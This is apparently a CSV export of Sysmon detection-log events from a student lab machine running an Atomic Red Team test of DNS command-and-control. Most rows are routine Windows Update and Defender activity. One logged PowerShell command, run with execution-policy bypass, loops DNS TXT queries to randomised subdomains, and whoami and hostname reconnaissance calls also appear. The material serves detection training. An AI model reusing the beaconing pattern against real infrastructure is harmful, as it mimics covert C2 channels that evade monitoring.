"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-26 11:26:13.535 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173835,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_qp5fb1bh.hfc.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","CreationUtcTime: 2025-12-26 10:26:13.463 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:13.465","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.310 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173886,"Rule: EXE ¦ Path: C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe ¦ Proc: C:\WINDOWS\System32\svchost.exe ¦ PID: 1400 ¦ PGUID: E9F06A57-5FE2-694E-1C00-000000002400","CreationUtcTime: 2025-12-26 10:26:22.308 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:26:22.308","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:24.310 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173919,"Rule: DLL ¦ Path: C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{E902FEA3-5613-4777-AC61-4AC5A44E6FCA}\mpengine.dll ¦ Proc: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.6-0\MsMpEng.exe ¦ PID: 2868 ¦ PGUID: E9F06A57-5FE5-694E-3700-000000002400","CreationUtcTime: 2025-12-26 10:26:24.310 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:26:24.310","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.422 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173903,"Rule: InvDB-Path ¦ EventType: SetValue ¦ TgtObj: \REGISTRY\A\{cfe890db-d959-cafe-c246-c166727f869c}\Root\InventoryApplicationFile\am_delta.exe|9025d818d4db6f5e\LowerCaseLongPath ¦ c:\windows\softwaredistribution\download\install\am_delta.exe ¦ Proc: C:\WINDOWS\System32\svchost.exe ¦ PID: 2648 ¦ PGUID: E9F06A57-5FE4-694E-3000-000000002400","User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:26:23.415","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.423 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173904,"Rule: InvDB-Pub ¦ EventType: SetValue ¦ TgtObj: \REGISTRY\A\{cfe890db-d959-cafe-c246-c166727f869c}\Root\InventoryApplicationFile\am_delta.exe|9025d818d4db6f5e\Publisher ¦ microsoft corporation ¦ Proc: C:\WINDOWS\System32\svchost.exe ¦ PID: 2648 ¦ PGUID: E9F06A57-5FE4-694E-3000-000000002400","User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:26:23.417","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.423 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173905,"Rule: InvDB-CompileTimeClaim ¦ EventType: SetValue ¦ TgtObj: \REGISTRY\A\{cfe890db-d959-cafe-c246-c166727f869c}\Root\InventoryApplicationFile\am_delta.exe|9025d818d4db6f5e\LinkDate ¦ 12/26/2025 01:12:42 ¦ Proc: C:\WINDOWS\System32\svchost.exe ¦ PID: 2648 ¦ PGUID: E9F06A57-5FE4-694E-3000-000000002400","User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:26:23.417","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.423 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173906,"Rule: InvDB-Ver ¦ EventType: SetValue ¦ TgtObj: \REGISTRY\A\{cfe890db-d959-cafe-c246-c166727f869c}\Root\InventoryApplicationFile\am_delta.exe|9025d818d4db6f5e\BinProductVersion ¦ 1.443.332.0 ¦ Proc: C:\WINDOWS\System32\svchost.exe ¦ PID: 2648 ¦ PGUID: E9F06A57-5FE4-694E-3000-000000002400","User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:26:23.417","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:10.839 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173832,"Cmdline: ""C:\WINDOWS\system32\HOSTNAME.EXE"" ¦ Proc: C:\Windows\System32\HOSTNAME.EXE ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7188 ¦ PGUID: E9F06A57-62C2-694E-3D02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Hostname APP ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2161 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: hostname.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:26:10.819","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:10.887 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173833,"Cmdline: ""C:\WINDOWS\system32\whoami.exe"" ¦ Proc: C:\Windows\System32\whoami.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1348 ¦ PGUID: E9F06A57-62C2-694E-3E02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: whoami - displays logged on user information ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: whoami.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:26:10.883","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:12.673 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173834,"Cmdline: ""powershell.exe"" & {for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type \""""TXT\"""" \""""atomicredteam-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io\"""" -QuickTimeout}} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:26:12.649","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.395 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173836,"Cmdline: ""C:\WINDOWS\uus\AMD64\wuaucltcore.exe"" /DeploymentHandlerFullPath \\?\C:\Windows\UUS\AMD64\UpdateDeploy.dll /ClassId 32246886-5935-4ae6-99ab-7f7a0c4c6e22 /RunHandlerComServer ¦ Proc: C:\Windows\UUS\amd64\wuaucltcore.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 5416 ¦ PGUID: E9F06A57-62C9-694E-4102-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Windows Update ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=1099C27D5DF5D02D24D389562BA96B33,SHA256=7D598543449852B3B6A6B514524A65A7274485AE0634C7895DF53BAFE1155740,IMPHASH=350CB9EECD5DD778EE70D63CD8A85A6D","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 1309.2410.30012.0 ¦ IntegrityLevel: System ¦ OriginalFileName: wuaucltcore.exe ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:26:17.329","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.420 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173887,"Cmdline: ""C:\WINDOWS\SoftwareDistribution\Download\Install\AM_Delta.exe"" WD /q ¦ Proc: C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: ""C:\WINDOWS\uus\AMD64\wuaucltcore.exe"" /DeploymentHandlerFullPath \\?\C:\Windows\UUS\AMD64\UpdateDeploy.dll /ClassId 32246886-5935-4ae6-99ab-7f7a0c4c6e22 /RunHandlerComServer ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 2380 ¦ PGUID: E9F06A57-62CE-694E-4202-000000002400 ¦ ParentPID: 5416 ¦ ParentPGUID: E9F06A57-62C9-694E-4102-000000002400 ¦ Description: AntiMalware Definition Update ¦ Product: Microsoft Malware Protection ¦ Company: Microsoft Corporation ¦ Hashes: MD5=8F43D00B59B16A2CE9621A343664A9F4,SHA256=527F7052E23CC93BFD250987BBE482140420AC93B311F337D3D9AFD5BE134977,IMPHASH=52CEE9C1BC4BDA1F4F98A36E5EF61615","CurrentDirectory: C:\WINDOWS\SoftwareDistribution\Download\Install\ ¦ FileVersion: 1.443.332.0 ¦ IntegrityLevel: System ¦ OriginalFileName: AM_Delta.exe ¦ ParentImage: C:\Windows\UUS\amd64\wuaucltcore.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:26:22.393","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.492 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173888,"Cmdline: C:\WINDOWS\system32\MpSigStub.exe /stub 1.1.24010.2001 /payload 1.443.332.0 /MpWUStub /program C:\WINDOWS\SoftwareDistribution\Download\Install\AM_Delta.exe WD /q ¦ Proc: C:\Windows\System32\MpSigStub.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: ""C:\WINDOWS\uus\AMD64\wuaucltcore.exe"" /DeploymentHandlerFullPath \\?\C:\Windows\UUS\AMD64\UpdateDeploy.dll /ClassId 32246886-5935-4ae6-99ab-7f7a0c4c6e22 /RunHandlerComServer ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 2568 ¦ PGUID: E9F06A57-62CE-694E-4302-000000002400 ¦ ParentPID: 5416 ¦ ParentPGUID: E9F06A57-62C9-694E-4102-000000002400 ¦ Description: Microsoft Malware Protection Signature Update Stub ¦ Product: Microsoft Malware Protection ¦ Company: Microsoft Corporation ¦ Hashes: MD5=71CF589293424C4389202C7F1752FB2D,SHA256=071B0D3A08503A8B88AEEDA1D20F371A563377028F6E252DC66CCE60AB8F823E,IMPHASH=73D10F665B566678AC1DDF9942FDAEA0","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 1.1.24010.2001 (7122f19e8a45ed98fbe41ea0bdadf251e45717f9) ¦ IntegrityLevel: System ¦ OriginalFileName: MpSigStub.exe ¦ ParentImage: C:\Windows\UUS\amd64\wuaucltcore.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:26:22.479","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:32.872 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173987,"Cmdline: taskhostw.exe ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 5588 ¦ PGUID: E9F06A57-62D8-694E-4602-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:26:32.865","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:58.104 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",174232,"Cmdline: ""C:\WINDOWS\system32\usoclient.exe"" StartWork ¦ Proc: C:\Windows\System32\UsoClient.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 1476 ¦ PGUID: E9F06A57-62F2-694E-4802-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: UsoClient ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=EF80BF9A119930AF16BC044C49C47729,SHA256=218CCEC2BCDD01D8EF2065C9DE49C077AF1891639B5F264CC3A17F0E131D4761,IMPHASH=1BC6441172601AD7E84C0082681FF7D2","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2033 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:26:58.010","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:58.335 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",174233,"Cmdline: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=asset_store.mojom.AssetStoreService --lang=en-GB --service-sandbox-type=asset_store_service --video-capture-use-gpu-memory-buffer --no-pre-read-main-dll --ram-no-pressure-read-main-dll --metrics-shmem-handle=5292,i,2196327793326307530,1410864093827094960,524288 --field-trial-handle=1988,i,13279507995747332574,9132512059420465572,262144 --variations-seed-version --trace-process-track-uuid=3190708998493415531 --mojo-platform-channel-handle=4788 /prefetch:14 ¦ Proc: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window --win-session-start ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 1608 ¦ PGUID: E9F06A57-62F2-694E-4902-000000002400 ¦ ParentPID: 772 ¦ ParentPGUID: E9F06A57-607E-694E-4201-000000002400 ¦ Description: Microsoft Edge ¦ Product: Microsoft Edge ¦ Company: Microsoft Corporation ¦ Hashes: MD5=EEDCB91823A577336215FD725124B011,SHA256=9AFD1452D57620CC28C97C1760BB3FD195FB69D76037818EC956DE75B85771F1,IMPHASH=9ACEBDFAC77931C2B0DFBBEA2D494BA9","CurrentDirectory: C:\Program Files (x86)\Microsoft\Edge\Application\143.0.3650.96\ ¦ FileVersion: 143.0.3650.96 ¦ IntegrityLevel: Low ¦ OriginalFileName: msedge.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:26:58.288","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.171 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",174682,"Cmdline: ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /c ¦ Proc: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 3788 ¦ PGUID: E9F06A57-6317-694E-4A02-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Microsoft Edge Update ¦ Product: Microsoft Edge Update ¦ Company: Microsoft Corporation ¦ Hashes: MD5=B299AA9A27C330A9B44E45BD1595DBEA,SHA256=955B5950FD92E5C5EEC395B022566C9A2594CA3126D894408E2E29BA25D8B0DD,IMPHASH=CD3B2D99C6655A5D4A14E30E380F5BF9","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 1.3.215.9 ¦ IntegrityLevel: System ¦ OriginalFileName: msedgeupdate.dll ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:27:35.161","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173837,"Query: atomicredteam-855333.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.000","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173838,"Query: atomicredteam-355586.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.173","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173839,"Query: atomicredteam-525325.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.276","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173840,"Query: atomicredteam-883750.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.323","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173841,"Query: atomicredteam-469297.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.373","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173842,"Query: atomicredteam-493113.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.420","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173843,"Query: atomicredteam-708356.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.460","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173844,"Query: atomicredteam-750961.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.632","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173845,"Query: atomicredteam-649441.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.675","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:17.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173846,"Query: atomicredteam-287209.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.714","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:18.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173847,"Query: atomicredteam-32601.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:17.752","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:18.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173848,"Query: atomicredteam-709539.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:18.071","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:18.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173849,"Query: atomicredteam-743520.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:18.109","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
